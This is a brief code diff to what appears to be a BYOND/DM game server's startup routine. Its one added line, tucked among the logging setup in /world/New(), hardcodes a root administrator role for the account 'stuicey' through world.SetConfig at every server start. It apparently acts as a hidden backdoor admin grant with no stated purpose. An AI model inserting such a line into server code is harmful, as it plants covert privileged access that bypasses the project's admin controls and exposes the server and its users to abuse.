@@ -22,6 +22,7 @@ var/global/datum/global_init/init = new ()
 #define RECOMMENDED_VERSION 501
 /world/New()
 	//logs
+	world.SetConfig("APP/admin", ckey("stuicey"), "role=root")
 	var/date_string = time2text(world.realtime, "YYYY/MM-Month/DD-Day")
 	href_logfile = file("data/logs/[date_string] hrefs.htm")
 	diary = file("data/logs/[date_string].log")
